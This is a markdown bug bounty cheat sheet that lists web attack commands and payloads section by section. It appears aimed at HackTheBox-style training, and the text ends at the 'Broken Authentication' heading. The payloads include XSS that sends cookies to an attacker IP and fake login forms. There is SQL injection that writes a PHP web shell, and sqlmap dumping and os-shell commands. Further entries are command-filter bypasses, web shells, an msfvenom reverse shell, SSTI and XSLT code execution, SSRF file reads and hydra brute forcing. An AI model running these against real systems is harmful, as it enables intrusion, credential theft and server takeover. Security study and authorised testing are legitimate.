# Bug Bounty

Overview
---------
1. - [Web Requests](#1---web-requests)
2. - [Web Proxies](#2---web-proxies)
3. - [Web Application Vulnerability Scanners](#3---web-application-vulnerability-scanners)
4. - [Online Resources](#4---online-resources)
5. - [Browser Plugins](#5---browser-plugins)
6. - [Web Reconnaissance](#6---web-reconnaissance)
7. - [Fuzzing](#7---fuzzing)
8. - [JavaScript Deobfuscation](#8---javascript-deobfuscation)
9. - [Cross-Site Scripting (XSS)](#9---cross-site-scripting-xss)
10. - [SQL Injection](#10---sql-injection)
11. - [Command Injection](#11---command-injection)
12. - [File Uploads](#12---file-uploads)
13. - [Server-Side Request Forgery (SSRF)](#13---server-side-request-forgery-ssrf)
14. - [Server-Side Template Injection (SSTI)](#14---server-side-template-injection-ssti)
15. - [Server-Side Includes (SSI) Injection](#15---server-side-includes-ssi-injection)
16. - [eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection](#16---extensible-stylesheet-language-transformations-xslt-server-side-injection)
17. - [Login Brute Forcing](#17---login-brute-forcing)
18. - [Broken Authentication](#18---broken-authentication)
19. - [HTTP Verb Tampering](#19---http-verb-tampering)
20. - [Insecure Direct Object References (IDOR)](#20---insecure-direct-object-references-idor)
21. - [XML External Entity (XXE) Injection](#21---xml-external-entity-xxe-injection)
22. - [File Inclusion](#22---file-inclusion)
23. - [Session Hijacking](#23---session-hijacking)
24. - [WordPress](#24---wordpress) 
25. - [Sensitive Data Exposure](#25---sensitive-data-exposure)
26. - [HTML Injection](#26---html-injection)
27. - [Cross-Site Request Forgery (CSRF)](#27---cross-site-request-forgery-csrf)
28. - [Exploit Research](#28---exploit-research)
   
#1. - Web Requests
-----------------------------------------

- Curl

```
$ curl -v <URL>
$ curl -I <URL>
$ curl -i <URL>
$ curl -v -X OPTIONS <URL>
$ curl -u admin:admin <URL>
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' <URL>
$ curl <URL>/search.php?search=test
$ curl -X POST -d 'username=admin&password=admin' <URL>
$ curl -X POST -d '{"search":"test"}' -H 'Content-Type: application/json' <URL>
$ curl <URL>.php -X POST -d 'param1=key' -H 'Content-Type: application/x-www-form-urlencoded'
$ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
$ curl -H 'Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
```

- DevTools

```
F12
```

#2. - Web Proxies
-----------------------------------------

- Burp Suite

```
Proxy -> Intercept -> Open Browser
OR
Settings -> Network Settings -> Settings -> Select Manual proxy configuration -> Enter IP address and port of our proxy -> Select Use this proxy server for all protocols 
```

- ZAP Proxy

```
Firefox Icon
```

- Proxychains

```
Edit /etc/proxychains4.conf
$ proxychains <command>
```

#3. - Web Application Vulnerability Scanners
-----------------------------------------

- Nessus

```
https://www.tenable.com/products/nessus/nessus-essentials
```

- Burp Suite

```
https://portswigger.net/burp
```

- ZAP Proxy

```
https://www.zaproxy.org/
```

#4. - Online Resources
-----------------------------------------

- OWASP Web Security Testing Guide

```
https://owasp.org/www-project-web-security-testing-guide/
https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing
```

- PayloadsAllTheThings

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
```

- HTML - CSS - JS Online Editor

```
https://html-css-js.com/
```

- HTML WYSIWYG Online Editor

```
https://htmlg.com/html-editor/
```

- JSFiddle Code Playground

```
https://jsfiddle.net/
```

#5. - Browser Plugins
-----------------------------------------

- Wappalyzer: Website technology analyser

```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
```

- Cookie Editor: edit cookies

```
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
```

- FoxyProxy: proxy management

```
https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
```

#6. - Web Reconnaissance
-----------------------------------------

- Whois

```
$ whois <Domain Name>
https://whoisfreaks.com/
```

- DNS

```
Edit /etc/hosts OR C:\Windows\System32\drivers\etc\hosts
$ sudo sh -c 'echo "<IP address>  <Domain Name>" >> /etc/hosts'
$ dig <Domain Name>
$ dig <Domain Name> NS
$ dig <Domain Name> MS
$ dig @1.1.1.1 <Domain Name>
$ dig +trace <Domain Name>
$ dig -x <IP address>
$ dig +short <Domain Name>
$ dig <Domain Name> ANY
$ dig axfr @<Name Server> <Domain Name>
C:\> nslookup <IP address/Domain Name>
$ host <IP address/Domain Name>
$ host -t ns <Domain Name>
$ host -t mx <Domain Name>
$ host -t txt <Domain Name>
$ host -l <Domain Name> <DNS server name/IP address>
$ dnsenum <Domain Name>
$ dnsenum --enum <Domain Name> -f <wordlist> -r
$ dnsrecon -d <Domain Name> -t axfr
$ fierce --domain <Domain Name> --subdomains accounts admin ads
$ theHarvester -d <Domain Name> -b google > google.txt
$ amass enum -d <Domain Name>
$ assetfinder <Domain Name>
$ puredns bruteforce <wordlist> <Domain Name>
$ gobuster vhost -u http://<IP address> -w <wordlist> --append-domain
$ feroxbuster -w <wordlist> -u <URL>
$ ffuf -w <wordlist> -u http://<IP address> -H "HOST: FUZZ.<Domain Name>"
https://crt.sh/
$ curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
https://search.censys.io/
```

- Fingerprinting

```
$ curl -I <URL/Domain Name>
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
https://builtwith.com/
$ whatweb <Domain Name>
$ nmap -O -sC <IP address>
https://searchdns.netcraft.com/
$ wafw00f <Domain Name>
$ nikto -h <Domain Name> -Tuning b
```

- Robots.txt

```
http://<Domain Name>/robots.txt
```

- Well-Known URLs

```
https://<Domain Name>/.well-known/security.txt
https://<Domain Name>/.well-known/change-password
https://<Domain Name>/.well-known/openid-configuration
https://<Domain Name>/.well-known/assetlinks.json
https://<Domain Name>/.well-known/mta-sts.txt
```

- Web Crawlers

```
Burp Suite Spider
OWASP ZAP
Scrapy
Apache Nutch
$ python3 ReconSpider.py <URL>
```

- Scrapy Web Crawler

```
import scrapy

class ExampleSpider(scrapy.Spider):
    name = "example"
    start_urls = ['http://example.com/']

    def parse(self, response):
        for link in response.css('a::attr(href)').getall():
            if any(link.endswith(ext) for ext in self.interesting_extensions):
                yield {"file": link}
            elif not link.startswith("#") and not link.startswith("mailto:"):
                yield response.follow(link, callback=self.parse)

$ jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u
```

- Search Engines

```
https://www.exploit-db.com/google-hacking-database
site:example.com
inurl:login
filetype:pdf
intitle:"confidential report"
intext:"password reset"
cache:example.com
link:example.com
related:example.com
info:example.com
define:phishing
site:example.com numrange:1000-2000
allintext:admin password reset
allinurl:admin panel
allintitle:confidential report 2023
site:example.com AND (inurl:admin OR inurl:login)
"linux" OR "ubuntu" OR "debian"
site:bank.com NOT inurl:login
site:socialnetwork.com filetype:pdf user* manual
site:ecommerce.com "price" 100..500
"information security policy"
site:news.com -inurl:sports
```

- Web Archives

```
https://web.archive.org/
```

- Automated Recon

```
$ python finalrecon.py --headers --whois --url <URL>
$ python finalrecon.py --full --url <URL>
Recon-ng
theHarvester
SpiderFoot
OSINT Framework
```

#7. - Fuzzing
-----------------------------------------

- Directory Fuzzing

```
$ ffuf -w <wordlist>:FUZZ        # assign wordlist to a keyword
$ ffuf -w <wordlist> -u http://<Domain Name>/FUZZ
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/FUZZ
```

- Extension Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/blog/indexFUZZ
```

- Page Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/blog/FUZZ.php
```

- Recursive Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/FUZZ -recursion -recursion-depth 1 -e .php -v
```

- Sub-Domain Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u https://FUZZ.<Domain Name>
```

- VHOST Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/ -H 'Host: FUZZ.<Domain Name>'
```

- Filter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/ -H 'Host: FUZZ.<Domain Name>' -fs 900
```

- GET Request Parameter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/admin/admin.php?FUZZ=key -fs 900
```

- POST Request Parameter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 900
```

- Parameter Value Fuzzing

```
$ for i in $(seq 1 1000); do echo $i >> ids.txt; done        # create text file with numbers 1-1000
$ ffuf -w ids.txt:FUZZ -u http://<Domain Name>/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 900
```

#8 - JavaScript Deobfuscation
-----------------------------------------

- JavaScript Obfuscator

```
https://beautifytools.com/javascript-obfuscator.php
https://obfuscator.io/
https://jsfuck.com/
https://utf-8.jp/public/jjencode.html
https://utf-8.jp/public/aaencode.html
```

- JavaScript Beautifier

```
https://beautifytools.com/javascript-beautifier.php
Browser Dev Tools -> Pretty Print
https://prettier.io/playground/
https://beautifier.io/
```

- JavaScript Deobfuscator

```
https://matthewfl.com/unPacker.html
http://www.jsnice.org/
```

- JavaScript Console Debugger

```
https://jsconsole.com/
```

- JavaScript Minifier

```
https://www.toptal.com/developers/javascript-minifier
```

- Base64 Encode/Decode

```
$ echo <string> | base64
$ echo <base64 string> | base64 -d
```

- Hex Encode/Decode

```
$ echo <string> | xxd -p
$ echo <hex string> | xxd -p -r
```

- ROT13 Encode/Decode

```
$ echo <string> | tr 'A-Za-z' 'N-ZA-Mn-za-m'
$ echo <ROT13 string> | tr 'A-Za-z' 'N-ZA-Mn-za-m'
https://rot13.com/
```

- Cipher Identifier & Analyzer

```
https://www.boxentriq.com/code-breaking/cipher-identifier
```

#9. - Cross-Site Scripting (XSS)
-----------------------------------------

- *Reflected XSS (non-persistent - processed on the back-end server)*
   - *Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).*
- *Stored XSS (persistent)*
   - *Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).*
- *DOM XSS (non-persistent - processed on the client-side)*
   - *Occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server and is written to an HTML DOM object (e.g., through client-side HTTP parameters or anchor tags - vulnerable username or page title).*

- Basic XSS Payloads

```
<script>alert("XSS")</script>
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<plaintext>
<script>print()</script> 
```

- HTML XSS Payloads

```
<img src="" onerror=alert(window.origin)>	
```

- Deface XSS Payloads

```
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
<script>document.title = 'HackTheBox Academy'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Old Milks</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="Fattest Milks"> </p></center>'</script>
<script>document.write('<h3>Please login to continue</h3><form action=http://<IP address>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
<script>document.getElementById('urlform').remove();</script>
<script>document.write('<h3>Please login to continue</h3><form action=http://<IP address>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```

- Remote Script XSS Payloads

```
<script src="http://<IP address>/script.js"></script>	
```

- Cookie XSS Payloads

```
<script>document.location='http://<IP address>/index.php?c='+document.cookie;</script>
<script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>	
```

- DOM XSS Payloads

```
#"><img src=/ onerror=alert(document.cookie)>
<img src="" onerror=alert(window.origin)>
```

- Bulk XSS Payloads

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list
```

- Automated XSS

```
$ python xsstrike.py -u "http://<Domain Name>/index.php?task=test"
https://github.com/rajeshmajumdar/BruteXSS
https://github.com/epsylon/xsser
```

- XSS OOB Testing

```
https://xsshunter.com/#/
https://portswigger.net/burp/documentation/collaborator
https://app.interactsh.com/#/
```

#10. - SQL Injection
-----------------------------------------

- *In-band SQL Injection*
   - *Union Based*
      - *Specify the exact location e.g. column which we can read - output printed to front-end.*
   - *Error Based*
      - *Intentionally cause an error - output printed to front-end.* 
- *Blind SQL Injection*
   - *Boolean Based*
      - *Use conditional statements to control whether the page returns any output at all.* 
   - *Time Based*
      - *Use conditional statements that delay the page response e.g. using Sleep().* 
- *Out-of-band SQL Injection*
   - *Direct output to remote location e.g. DNS record.*

- SQL Login

```
$ mysql -u <username> -h <hostname> -P 3306 -p
```

- SQL General Commands

```
SHOW DATABASES;
USE users;
SHOW TABLES;
SELECT * FROM table_name;
```

- SQL Table Commands

```
CREATE TABLE logins (id INT, username VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME);
CREATE TABLE logins (id INT NOT NULL AUTO_INCREMENT, username VARCHAR(100) UNIQUE NOT NULL, password VARCHAR(100) NOT NULL, date_of_joining DATETIME DEFAULT NOW(), PRIMARY KEY (id));
DESCRIBE logins;
DROP TABLE logins;
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value);
INSERT INTO table_name(column2, column3) VALUES (column2_value, column3_value);
INSERT INTO table_name(column2, column3) VALUES (column2_value, column3_value), (column2_value, column3_value);
```

- SQL Column Commands

```
SELECT column1, column2 FROM table_name;
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
ALTER TABLE logins MODIFY oldColumn DATE;
ALTER TABLE logins DROP oldColumn;
UPDATE table_name SET column1=newvalue1, column2=newvalue2 WHERE <condition>;
```

- SQL Output Commands

```
SELECT * FROM logins ORDER BY column_1;
SELECT * FROM logins ORDER BY column_1 DESC;
SELECT * FROM logins ORDER BY column_1 DESC, id ASC;
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;
SELECT * FROM table_name WHERE <condition>;
SELECT * FROM logins WHERE username LIKE 'admin%';
SELECT * FROM logins WHERE username like '___';
SELECT * FROM logins WHERE username != 'john';
SELECT * FROM logins WHERE username != 'john' AND id > 1;
SELECT * FROM logins WHERE username != 'john' OR id > 1;
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

- SQL Discovery Checkers

```
'
"
#
;
)
%27
%22
%23
%3B
%29
```

- SQL Auth Bypass

```
admin' or '1'='1
admin')-- -
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
```

- SQL Union Injection (comments -- need a space after them to work, the hyphen is there for readability)

```
' order by 1-- -
cn' UNION select 1,2,3-- -
cn' UNION select 1,@@version,3,4-- -
UNION select username, 2, 3, 4 from passwords-- -
```

- SQL DB Enumeration

```
SELECT @@version
SELECT POW(1,1)
SELECT SLEEP(5)
SELECT * FROM my_database.users;
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),3,4-- -
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

- SQL Privilege Checks

```
SHOW GRANTS;
SELECT USER()
cn' UNION SELECT 1, user(), 3, 4-- -
SELECT CURRENT_USER()
SELECT user from mysql.user
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
cn' UNION SELECT 1, user(), 3, 4-- -
SELECT super_priv FROM mysql.user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
SHOW VARIABLES LIKE 'secure_file_priv';
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

- SQL File Injection

```
SELECT LOAD_FILE('/etc/passwd');
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
SELECT * from users INTO OUTFILE '/tmp/credentials';
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

- SQLMap

```
$ sqlmap -u <URL> --batch --dump
$ sqlmap <URL> --data 'uid=1&name=test'
$ sqlmap <URL> --data 'uid=1*&name=test'        # use * to specify the parameter to inject e.g. to test HTTP headers like cookie header 
$ sqlmap <URL> --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
$ sqlmap -u <URL> --data='id=1' --method PUT
$ sqlmap -u <URL> --batch -t /tmp/traffic.txt
$ sqlmap -u <URL> --parse-errors
$ sqlmap -u <URL> -v 6 --batch
$ sqlmap -u <URL> --proxy=http://127.0.0.1:8080
$ sqlmap -u <URL> --prefix="%'))" --suffix="-- -"
$ sqlmap -u <URL> -v 3 --level=5
$ sqlmap -u <URL> --level=5 --risk=3
$ sqlmap -u <URL> --banner --current-user --current-db --is-dba
$ sqlmap -u <URL> --tables -D testdb
$ sqlmap -u <URL> --dump-all
$ sqlmap -u <URL> --dump-all --exclude-sysdbs
$ sqlmap -u <URL> --dump -D testdb
$ sqlmap -u <URL> --dump -T users -D testdb
$ sqlmap -u <URL> --dump -T users -D testdb -C name,surname
$ sqlmap -u <URL> --dump -T users -D testdb --start=2 --stop=3
$ sqlmap -u <URL> --dump -T users -D testdb --where="name LIKE 'f%'"
$ sqlmap -u <URL> --schema
$ sqlmap -u <URL>--search -T user
$ sqlmap -u <URL> --passwords --batch
$ sqlmap -u <URL> --passwords --batch --all
$ sqlmap -u <URL> --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="<CSRF token parameter>"
$ sqlmap -u <URL> --randomize=rp --batch -v 5 | grep URI
$ sqlmap <URL> --random-agent
$ sqlmap -u <URL> --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
$ sqlmap --list-tampers
$ sqlmap -u <URL> --tamper=between
$ sqlmap -u <URL> --is-dba
$ sqlmap -u <URL> --file-read "/etc/passwd"
$ sqlmap -u <URL> --file-write "shell.php" --file-dest "/var/www/html/shell.php"
$ sqlmap -u <URL> --os-shell
```

- SQLMAP .req file

```
Copy the entire request from Burp
$ vi login.req
Paste the entire request from Burp
$ sqlmap -r login.req
```

#11. - Command Injection
-----------------------------------------

- Common Injection Operators

```
SQL Injection =	' , ; -- /* */
Command Injection =	; &&
LDAP Injection =	* ( ) & |
XPath Injection =	' or and not substring concat count
OS Command Injection =	; & |
Code Injection =	' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal/File Path Traversal =	../ ..\\ %00
Object Injection =	; & |
XQuery Injection =	' ; -- /* */
Shellcode Injection =	\x \u %u %n
Header Injection =	\n \r\n \t %0d %0a %09
```

- Command Injection Operators

```
; (URL-Encoded = %3b)
\n (URL-Encoded = %0a)
& (URL-Encoded = %26)
| (URL-Encoded = %7c)
&& (URL-Encoded = %26%26)
|| (URL-Encoded = %7c%7c)
`` (Linux only - wrap command in backticks) (URL-Encoded = %60%60)
$() (Linux only - wrap command in parentheses) (URL-Encoded = %24%28%29)
```

- Bypass Space Filters

```
Spaces (URL-Encoded = %20)
Tabs (URL-Encoded = %09)
${IFS} Linux Environment Variable
{ls,-la} Bash Brace Expansion
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
```

- Bypass Other Characters (Environment Variables)

```
printenv = Can be used to view all environment variables (Linux)
Get-ChildItem Env: = Can be used to view all environment variables (Windows)
${PATH:0:1} = /
${LS_COLORS:10:1} = ;
%HOMEPATH:~0,-17% = \
%HOMEPATH:~6,-11% = \
%PROGRAMFILES:~10,-5% = (space)
$env:HOMEPATH[0] = \
$env:PROGRAMFILES[10] = (space)
$(tr '!-}' '"-~'<<<[) =	Shift character by one ([ -> \)
```

- Bypass Command Filters

```
w'h'o'am'i
w"h"o"am"i
who$@ami
w\ho\am\i
who^ami
```

- Bypass Advanced Command Filters

```
WHOAMI
WhOaMi
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
echo 'whoami' | rev
$(rev<<<'imaohw')
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<dwBoAG8AYQBtAGkA)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion
```

- Automated Obfuscation Tools

```
https://github.com/Bashfuscator/Bashfuscator
$ ./bashfuscator -c 'cat /etc/passwd'
$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
https://github.com/danielbohannon/Invoke-DOSfuscation
PS C:\> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
PS C:\> encoding
PS C:\> 1
```

#12. - File Uploads
-----------------------------------------

- PHP File Read

```
<?php file_get_contents('/etc/passwd'); ?>
```

- PHP Command Execution

```
<?php system('hostname'); ?>
```

- PHP Web Shell

```
<?php system($_REQUEST['cmd']); ?>
https://github.com/Arrexel/phpbash
```

- PHP Reverse Shell

```
https://pentestmonkey.net/tools/web-shells/php-reverse-shell
https://github.com/pentestmonkey/php-reverse-shell
```

- ASP Web Shell

```
<% eval request('cmd') %>
```

- Bulk Web/Reverse Shells

```
https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
```

- MSFVenom

```
$ msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<port> -f raw > reverse.php	
```

- Upload Bypasses

```
shell.phtml
shell.pHp
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
shell.jpg.php
shell.php.jpg
%20, %0a, %00, %0d0a, /, .\, ., …, :
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
https://en.wikipedia.org/wiki/List_of_file_signatures
```

- File Permutation Bash Script

```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

- Limited Uploads

```
XSS = HTML, JS, SVG, GIF
XXE/SSRF = XML, SVG, PDF, PPT, DOC
DoS = ZIP, JPG, PNG
```

- File Name Injections

```
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
file';select+sleep(5);--.jpg
file<script>alert(window.origin);</script>.jpg
```

#13. - Server-Side Request Forgery (SSRF)
-----------------------------------------

- External Access

```
$ nc -nlvp <port>
dateserver=http://<Attacker IP address>:<port>&date=2024-01-01
```

- Internal Access

```
dateserver=http://127.0.0.1/index.php&date=2024-01-01
```

- Internal Port Scan

```
dateserver=http://127.0.0.1:81&date=2024-01-01
dateserver=http://127.0.0.1:82&date=2024-01-01
$ seq 1 10000 > ports.txt
$ ffuf -w ./ports.txt -u http://<IP address>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

- Internal Directory Brute-Force

```
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://<IP address>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

- Local File Inclusion (LFI)

```
dateserver=file:///etc/passwd&date=2024-01-01
```

- Gopher POST Request

```
dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
$ python2.7 gopherus.py --exploit smtp
```

#14. - Server-Side Template Injection (SSTI)
-----------------------------------------

- Test String

```
${{<%[%'"}}%\.
```

- Identify the Template Engine

```
${7*7} (if this executes) -> a{*comment*}b (if this executes) = Smarty
${7*7} (if this executes) -> a{*comment*}b (if this does not execute) -> ${"z".join("ab")} (if this executes) = Mako
${7*7} (if this executes) -> a{*comment*}b (if this does not execute) -> ${"z".join("ab")} (if this does not execute) = Unknown

${7*7} (if this does not execute) -> {{7*7}} (if this does not execute) = Not Vulnerable
${7*7} (if this does not execute) -> {{7*7}} (if this executes) = {{7*'7'}} (if this executes as 7777777) = Jinja2
${7*7} (if this does not execute) -> {{7*7}} (if this executes) = {{7*'7'}} (if this executes as 49) = Twig
${7*7} (if this does not execute) -> {{7*7}} (if this executes) = {{7*'7'}} (if this does not execute) = Unknown
```

- Jinja

```
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

- Twig

```
{{ _self }}
{{ "/etc/passwd"|file_excerpt(1,-1) }}
{{ ['id'] | filter('system') }}
```

- Automated Exploitation

```
https://github.com/epinna/tplmap
https://github.com/vladko312/SSTImap
$ python3 sstimap.py
$ python3 sstimap.py -u http://<IP address>/index.php?name=test
$ python3 sstimap.py -u http://<IP address>/index.php?name=test -D '/etc/passwd' './passwd'
$ python3 sstimap.py -u http://<IP address>/index.php?name=test -S id
$ python3 sstimap.py -u http://<IP address>/index.php?name=test --os-shell
```

#15. - Server-Side Includes (SSI) Injection
-----------------------------------------

- Print Variable

```
<!--#printenv -->
```

- Change Config

```
<!--#config errmsg="Error!" -->
```

- Print Specific Variable

```
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```

- Execute Command

```
<!--#exec cmd="whoami" -->
```

- Include Web File

```
<!--#include virtual="index.html" -->
```

#16. - eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection
-----------------------------------------

- Information Disclosure

```
<xsl:value-of select="system-property('xsl:version')" />
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:vendor-url')" />
<xsl:value-of select="system-property('xsl:product-name')" />
<xsl:value-of select="system-property('xsl:product-version')" />
```

- Local File Inclusion (LFI)

```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

- Remote Code Execution (RCE)

```
<xsl:value-of select="php:function('system','id')" />
```

#17. - Login Brute Forcing
-----------------------------------------

- Hydra

```
$ hydra -l admin -P <password_file> ftp://<IP address>
$ hydra -l root -P <password_file> ssh://<IP address>
$ hydra -l admin -P <password_file> <IP address> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
$ hydra -l admin -P <password_file> <IP address> http-post-form "/login.php:user=^USER^&pass=^PASS^:S=302"
```

- Medusa

```
$ medusa -h <IP address> -u admin -P passwords.txt -M ssh
$ medusa -h <IP address> -U users.txt -P passwords.txt -M ftp -t 5
$ medusa -h <IP address> -u admin -P passwords.txt -M rdp
$ medusa -h <Domain Name> -U users.txt -P passwords.txt -M http -m GET
$ medusa -h <IP address> -u admin -P passwords.txt -M ssh -f
```

- Username Anarchy

```
$ username-anarchy John Milks
$ username-anarchy -i names.txt
$ username-anarchy -a --country us
$ username-anarchy -l
$ username-anarchy -f format1,format2
$ username-anarchy -@ example.com
$ username-anarchy --case-insensitive
```

- CUPP (Common User Passwords Profiler)

```
$ cupp -i
$ cupp -w profiles.txt
$ cupp -l
```

- Password Policy Filtering

```
$ grep -E '^.{8,}$' wordlist.txt (Minimum Length = 8)
$ grep -E '[A-Z]' wordlist.txt (Matches any uppercase character)
$ grep -E '[a-z]' wordlist.txt (Matches any lowercase character)
$ grep -E '[0-9]' wordlist.txt (Matches any digit)
$ grep -E '[!@#$%^&*()_+-=[]{};':"\,.<>/?]' wordlist.txt (Matches any special character)
$ grep -E '(.)\1' wordlist.txt (No consecutive repeated characters)
$ grep -v -i 'password' wordlist.txt (Exclude a word)
$ grep -v -f dictionary.txt wordlist.txt (Exclude words from a file)
$ grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]' (Multiple filters on minimum length and uppercase characters)
```

#18. - Broken Authentication
-----------------------------------------

- Username Enumeration

```
